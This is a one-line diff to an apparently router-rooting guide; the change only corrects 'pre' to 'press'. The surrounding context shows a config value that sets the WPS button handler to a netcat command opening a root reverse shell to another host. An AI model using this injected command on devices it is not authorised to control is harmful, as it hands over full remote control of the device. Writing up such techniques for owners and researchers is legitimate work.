@@ -109,7 +109,7 @@ If your ISP updated the firmware and you are no longer able to exploit any publi
 ```
 button.wps.handler='nc 192.168.1.2 1337 -e /bin/sh || true'
 ```
-Upload the config and pre WPS button - you should receive a remote shell with root access
+Upload the config and press the WPS button - you should receive a remote shell with root access
 
 ## Python PoC
 
